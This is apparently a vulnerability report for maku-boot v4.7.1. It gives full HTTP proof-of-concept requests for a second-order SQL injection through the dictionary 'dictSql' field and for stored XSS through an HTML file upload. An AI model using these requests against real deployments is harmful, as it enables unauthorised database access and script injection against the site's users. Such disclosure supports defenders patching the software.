BUG_Author

Longlong Gong

# Project

Address: [maku-boot](https://gitee.com/makunet/maku-boot)

## SQL inject

###  `/sys/dict/type` `/sys/dict/type/list/sql` SQL inject

[Affected version]

v4.7.1



[Affected Component]

/sys/dict/type

/sys/dict/type/list/sql



[Software]

https://gitee.com/makunet/maku-boot/archive/refs/tags/v4.7.1.zip



[Description]

The Maku boot system v4.7.1 has a secondary injection vulnerability in the dictSQL parameter of the `/sys/dict/type ` interface, which allows SQL statements to be constructed and executed through `/sys/dict/type/list/SQL `. Hackers can exploit this vulnerability to obtain sensitive server information

POC

```
PUT /sys/dict/type HTTP/1.1
Host: localhost:8080
Content-Length: 200
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Accept-Language: zh-CN
sec-ch-ua-mobile: ?0
Authorization: e60fda52a3914db289021127fa8803fe
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
sec-ch-ua-platform: "Windows"
Origin: http://localhost:3000
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate
Connection: close

{"id":1,"dictType":"post_status","dictName":"1","sort":0,"pid":null,"dictSource":1,"dictSql":"select sleep(5)","remark":"1","createTime":"2025-03-04 22:09:20","updateTime":"2025-03-04 23:17:54","hasChild":0}
```

```
GET /sys/dict/type/list/sql?id=1 HTTP/1.1
Host: localhost:8080
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
sec-ch-ua-mobile: ?0
Authorization: e60fda52a3914db289021127fa8803fe
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:3000
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate
Connection: close


```

System Settings ->Data Dictionary ->Modify ->Dynamic SQL, add SQL statements, click on Dynamic Data Execution

![image-20250304234209327](assets/image-20250304234209327.png)

![image-20250304234234773](assets/image-20250304234234773.png)

![image-20250304234314957](assets/image-20250304234314957.png)

![image-20250304235133799](assets/image-20250304235133799.png)

maku-boot-v4.7.1\maku-boot-system\src\main\java\net\maku\system\dao\SysDictDataDao.java

![image-20250304234529278](assets/image-20250304234529278.png)

![image-20250304234614611](assets/image-20250304234614611.png)

![image-20250304234631087](assets/image-20250304234631087.png)

## Stored cross-site scripting

###  `/sys/file/upload` Stored cross-site scripting

[Affected version]

v4.7.1



[Affected Component]

/sys/file/upload



[Software]

https://gitee.com/makunet/maku-boot/archive/refs/tags/v4.7.1.zip



[Description]

The maku-boot system v4.7.1 has an XSS vulnerability caused by file uploads in the `/sys/file/upload` interface. The parameter name is not handled correctly. Hackers can exploit this vulnerability to obtain cookies, conduct phishing attacks, and carry out worm attacks. ...

POC

```
POST /sys/file/upload HTTP/1.1
Host: localhost:8080
Content-Length: 214
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9eFFKAGqBwkRuBTe
sec-ch-ua-mobile: ?0
Authorization: 37469739860d4b6095680d5cce450e37
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Origin: http://127.0.0.1:3000
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary9eFFKAGqBwkRuBTe
Content-Disposition: form-data; name="file"; filename="flag.html"
Content-Type: application/json

<script>alert(1)</script>
------WebKitFormBoundary9eFFKAGqBwkRuBTe--

```

Basic Tools - > Attachment Management - > Upload, change the suffix of the uploaded file to HTML, then the file content is JS code, and the link to access the return package constitutes XSS.

![image-20250305190634329](assets/image-20250305190634329.png)

![image-20250305190753610](assets/image-20250305190753610.png)

![image-20250305190721405](assets/image-20250305190721405.png)

![image-20250305190817611](assets/image-20250305190817611.png)

![image-20250305190943503](assets/image-20250305190943503.png)

![image-20250305191004774](assets/image-20250305191004774.png)
